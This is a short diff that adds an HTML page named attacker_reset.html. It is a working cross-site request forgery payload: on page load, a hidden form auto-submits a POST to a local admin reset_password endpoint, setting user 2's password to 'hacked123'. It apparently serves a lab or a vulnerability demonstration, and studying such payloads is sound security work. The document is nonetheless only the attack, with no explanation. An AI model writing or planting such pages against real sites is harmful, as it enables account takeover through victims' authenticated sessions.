@@ -1,0 +1,9 @@
+<!-- attacker_reset.html -->
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="http://localhost:5000/admin/reset_password" method="POST">
+      <input type="hidden" name="user_id" value="2">
+      <input type="hidden" name="new_password" value="hacked123">
+    </form>
+  </body>
+</html>
